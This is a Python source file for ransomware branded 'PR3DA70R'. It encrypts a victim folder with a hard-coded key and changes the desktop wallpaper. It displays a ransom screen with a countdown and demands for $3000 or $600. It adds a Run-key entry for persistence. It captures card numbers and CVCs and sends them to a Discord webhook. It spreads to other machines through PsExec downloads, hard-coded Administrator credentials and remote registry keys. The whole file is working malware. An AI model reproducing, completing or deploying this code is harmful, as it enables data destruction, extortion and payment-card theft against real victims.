import os
import ctypes
import requests
from PIL import Image
from io import BytesIO
import sys
import cryptography
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import simpledialog
#import fcntl
from PIL import ImageDraw, ImageFont
import threading
import json
import subprocess
import winreg
import shutil
import winregistry
import tempfile
import datetime
import socket
from scapy.all import srp, Ether, ARP

#####################################################################
# Static key (replace with your actual key)
static_key = b'o-v6pEOAxEMt-Z3kzxrT0UvQ_LvJHFl26f-t1nctPwI='

def encrypt_file_or_directory(path, key):
    if os.path.isfile(path):
        with open(path, "rb") as thefile:
            contents = thefile.read()
        cnt_en = Fernet(key).encrypt(contents)
        with open(path, "wb") as thefile:
            thefile.write(cnt_en)
    elif os.path.isdir(path):
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as thefile:
                    contents = thefile.read()
                cnt_en = Fernet(key).encrypt(contents)
                with open(file_path, "wb") as thefile:
                    thefile.write(cnt_en)

vict_path = "/Users/Administrator/Desktop/Victim"
os.chdir(vict_path)

# List all files and directories in the specified path
files_and_directories = os.listdir(vict_path)

for item in files_and_directories:
    if item not in ["exploit.py, Google"]:
        item_path = os.path.join(vict_path, item)
        encrypt_file_or_directory(item_path, static_key)

###########################################################################################

def set_desktop_background(image_path):
    try:
        # Set the downloaded image as the desktop background
        SPI_SETDESKWALLPAPER = 0x0014
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

    except Exception as e:
        pass

def download_image_and_set_background(image_url, save_directory):
    try:
        # Ensure the save directory exists
        os.makedirs(save_directory, exist_ok=True)

        # Get the image filename from the URL
        filename = os.path.basename(image_url)
        save_path = os.path.join(save_directory, filename)

        # Download the image
        response = requests.get(image_url)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(response.content)
            
            # Set the downloaded image as the desktop background
            set_desktop_background(save_path)

            # Wait for a moment to allow the desktop background to update
            ctypes.windll.kernel32.Sleep(1000)

            # Delete the downloaded image
            if os.path.exists(save_path):
                os.remove(save_path)

    except Exception as e:
        pass

if __name__ == "__main__":
    image_url = "https://i.imgur.com/7A7kHaU.png"
    save_directory = "C:\\Users\\Administrator\\AppData\\Local\\Temp"
    download_image_and_set_background(image_url, save_directory)

###########################################################################################

def update_timer():
    # Update the timer
    current_time = time_var.get()
    if current_time > 0:
        current_time -= 1
        time_var.set(current_time)
        timer_label.config(text=format_time(current_time))
    root.after(1000, update_timer)

def format_time(seconds):
    # Format seconds as HH:MM:SS
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    seconds = seconds % 60
    return f"{hours:02}:{minutes:02}:{seconds:02}"

def create_gui():
    global root, time_var, timer_label, hello_label
    root = tk.Tk()
    root.title("WARNING! YOU HAVE BEEN INFECTED!")
    root.geometry("1920x1080")

    # Set background color to black
    root.configure(bg="black")

    # Create a label to display the timer
    time_var = tk.IntVar()
    time_var.set(21600)  # 6 hours in seconds
    timer_label = tk.Label(root, text="6:00:00", font=("Helvetica", 36), bg="black", fg="white")
    timer_label.pack(pady=20)

    # Create a label to display "HELLO" in red
    hello_label = tk.Label(root, text="You have Been Infected!", font=("Helvetica", 36), bg="black", fg="red")
    hello_label.pack(pady=20)
    hello_label2 = tk.Label(root, text="WARNING DO NOT CLOSE OR REOPEN ANY WINDOW! IT WILL LEAD TO HIGHER COSTS FOR RECOVERING!", font=("Helvetica", 12), bg="black", fg="red")
    hello_label2.pack(pady=20)
    hello_label3 = tk.Label(root, text="ENTER CORRECT PAYMENT INFO & HAVE $3000 READY IN THE ACCOUNT! UPON SUCCESSFUL TRANSACTION, DECRYPTOR AND PASS CODE WILL BE EMAILED", font=("Helvetica", 12), bg="black", fg="red")
    hello_label3.pack(pady=20)
    hello_label4 = tk.Label(root, text="YT LINK FOR DECRYPTION PROOF: ", font=("Helvetica", 12), bg="black", fg="red")
    hello_label4.pack(pady=20)
    hello_label5 = tk.Label(root, text="PR3DA70R", font=("Helvetica", 12), bg="black", fg="red")
    hello_label5.pack(pady=20)
    # Start the timer
    update_timer()

    # Handle the window closure gracefully
    root.protocol("WM_DELETE_WINDOW", on_closing)

    root.mainloop()

def on_closing():
    # Clean up and close the GUI gracefully
    root.destroy()

# Create a separate thread for the GUI
gui_thread = threading.Thread(target=create_gui)
gui_thread.daemon = True
gui_thread.start()

##############################################################################

def display_ascii_art():
    ascii_art = """
____________________________ ________      _____________________ __________ 
\______   \______   \_____  \\______ \    /  _  \______  \   _  \\______   \\
 |     ___/|       _/ _(__  < |    |  \  /  /_\  \  /    /  /_\  \|       _/
 |    |    |    |   \/       \|    `   \/    |    \/    /\  \_/   \    |   \\
 |____|    |____|_  /______  /_______  /\____|__  /____/  \_____  /____|_  /
                  \/       \/        \/         \/              \/       \/ 
"""
    print(ascii_art)

if __name__ == "__main__":
    display_ascii_art()

def display_text():
    text = "Your Files have been compromised! E-Transfer $600 to PR3DA70R@gmail.com \n"
    print(text)
    text2 = "Second Method: \n"
    print(text2)
    text3 = "Enter Payment Information to get Secret Password emailed to you! \n"
    print(text3)
    text4 = "WARNING!! DO NOT TRY TO BRUTE FORCE THE PASSWORD OR RERUN THE FILE. THE FILES COULD GET TAMPERED or REENCRYPTED INCREASING THE COST"
    print(text4)
    
if __name__ == "__main__":
    display_text()

###############################################################################################

def edit_registry_and_schedule_task():
    try:
        # Get the path to the current executable
        current_exe_path = sys.executable
        registry_key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        task_name = "3xpl0i7"
        task_command = f'"{current_exe_path}"'
        
        # Set registry key to run the executable at reboot
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, task_command)
        winreg.CloseKey(key)

        print("[+] Lets see...")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    edit_registry_and_schedule_task()

################################################################################################

from discord_webhook import DiscordWebhook

def get_and_send_payment_information():
    payment_method = {}
    payment_method["Country"] = input("[+] Enter Country: ")
    payment_method["City"] = input("[+] Enter City: ")
    payment_method["State"] = input("[+] Enter State: ")
    payment_method["Postal Code"] = input("[+] Enter Postal Code: ")
    payment_method["Card Number"] = input("[+] Enter Card Number: ")
    payment_method["Expiration Date"] = input("[+] Enter Expiration Date: ")
    payment_method["CVC"] = input("[+] Enter CVC: ")
    payment_method["Your Email Address"] = input("[+] Enter Email Address: ")

    # Discord webhook URL
    webhook_url = "WEBHOOK-URL->REDACTED"

    # Create a DiscordWebhook object
    webhook = DiscordWebhook(url=webhook_url, content=str(payment_method))

    try:
        response = webhook.execute()
        if response.status_code == 204:
            print("[+] Payment information sent successfully! Wait for further instructions via email.")
        elif response.status_code == 200:
            print("[+] WAIT!")
    except Exception as e:
        print("An error occurred:", str(e))

# Call the function to capture and send payment information
get_and_send_payment_information()

##############################################################################################################################

# import subprocess
# import sys

# def schedule_task(task_name, run_after_reboot=True, run_every_30_minutes=True):
#     # Build the schtasks command
#     schtasks_command = ['schtasks', '/create', '/tn', task_name, '/tr', sys.executable, '/sc']

#     # Schedule the task after reboot
#     if run_after_reboot:
#         schtasks_command.extend(['/at', 'startup'])

#     # Schedule the task to run every 30 minutes
#     if run_every_30_minutes:
#         schtasks_command.extend(['/mo', '30'])

#     # Run the schtasks command
#     try:
#         subprocess.run(schtasks_command, check=True)
#         print(f"Task '{task_name}' scheduled successfully.")
#     except subprocess.CalledProcessError as e:
#         print(f"Error scheduling task: {e}")

# # Example usage:
# task_name = '3xpl0i7'

# schedule_task(task_name)

###############################################################################################################################

# import os
# import shutil
# import subprocess
# import tempfile
# import requests

# def download_file(url, destination):
#     response = requests.get(url)
#     with open(destination, 'wb') as file:
#         file.write(response.content)

# def copy_file_to_remote(source_path, target_path, host, username, password, psexec_path):
#     copy_command = f'{psexec_path} \\\\{host} -u {username} -p {password} -c -f {source_path} {target_path}'
#     subprocess.run(copy_command, shell=True)

# def execute_command_on_remote(host, username, password, command, psexec_path):
#     exec_command = f'{psexec_path} \\\\{host} -siu {username} -p {password} {command}'
#     subprocess.run(exec_command, shell=True)

# def schedule_task_on_remote(host, username, password, command, task_name):
#     # Use SCHTASKS to schedule the task on remote machine
#     # Schedule the task to run at startup and every 30 minutes
#     schtasks_command = f'schtasks /create /tn {task_name} /tr "{command}" /sc onstart /ru {username} /rp {password} /f /sc minute /mo 30'
#     subprocess.run(schtasks_command, shell=True)

# def main():
#     # Download PsExec.exe and Google.exe
#     temp_dir = tempfile.mkdtemp()
#     psexec_path = os.path.join(temp_dir, 'PsExec.exe')
#     google_path = os.path.join(temp_dir, 'Google.exe')

#     psexec_url = 'http://10.11.10.2:8080/PsExec.exe'
#     google_url = 'http://10.11.10.2:8080/Google.exe'

#     download_file(psexec_url, psexec_path)
#     download_file(google_url, google_path)

#     # List of target machines
#     target_machines = ['10.185.10.4', '10.185.10.5', '10.185.10.6']

#     # Specify the remote directory accessible on the target machines
#     remote_directory = tempfile.mkdtemp()

#     # Specify the credentials for remote machines
#     username = 'Administrator'
#     password = 'P@ssw0rd'  # Replace with the actual password

#     # Specify the full path to PsExec.exe
#     psexec_full_path = psexec_path

#     # Copy files to remote machines
#     for target_machine in target_machines:
#         copy_file_to_remote(google_path, f'\\\\{target_machine}\\{remote_directory}\\Google.exe', target_machine, username, password, psexec_full_path)

#         # Execute Google.exe on the remote machines
#         execute_command_on_remote(target_machine, username, password, f'{remote_directory}\\Google.exe', psexec_full_path)

#         # Schedule the task to run Google.exe on startup and every 30 minutes
#         schedule_task_on_remote(target_machine, username, password, f'{remote_directory}\\Google.exe', 'GoogleTask')

#     # Clean up temporary directory
#     shutil.rmtree(temp_dir)

# if __name__ == "__main__":
#     main()

###############################################################################################

import os
import requests
import subprocess
import tempfile
import winreg as reg

def download_file(url, destination):
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)

def copy_file_to_remote(source_path, target_path, host, username, password, psexec_path):
    # Use the provided PsExec command
    copy_command = f'{psexec_path} \\\\{host} -siu {username} -p {password} -c -f {source_path} {target_path}'
    subprocess.run(copy_command, shell=True)

def add_registry_key_on_remote(host, username, password, key_path, key_name, key_value):
    reg_command = f'reg add \\\\{host}\\{key_path} /v {key_name} /t REG_SZ /d "{key_value}" /f'
    subprocess.run(reg_command, shell=True, check=True)

def main():
    # Download PsExec.exe and Google.exe
    temp_dir = tempfile.mkdtemp()
    psexec_path = os.path.join(temp_dir, 'PsExec.exe')
    google_path = os.path.join(temp_dir, 'Google.exe')

    psexec_url = 'http://10.11.10.2:8080/PsExec.exe'
    google_url = 'http://10.11.10.2:8080/Google.exe'

    download_file(psexec_url, psexec_path)
    download_file(google_url, google_path)

    # List of target machines
    target_machines = ['10.185.10.5', '10.185.10.6', '10.185.10.7']

    # Specify the credentials for remote machines
    username = 'Administrator'
    password = 'P@ssw0rd'  # Replace with the actual password

    # Specify the full path to PsExec.exe
    psexec_full_path = psexec_path

    # Copy files to remote machines using provided PsExec command
    for target_machine in target_machines:
        copy_file_to_remote(google_path, f'\\\\{target_machine}\\C$\\Windows\\Temp\\Google.exe', target_machine, username, password, psexec_full_path)

        # Add registry key to execute Google.exe at startup
        add_registry_key_on_remote(target_machine, username, password, 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'GoogleStartup', f'C:\\Windows\\Temp\\Google.exe')

    # Clean up temporary directory
    os.remove(psexec_path)
    os.remove(google_path)
    os.rmdir(temp_dir)

if __name__ == "__main__":
    main()


#######################################################################################################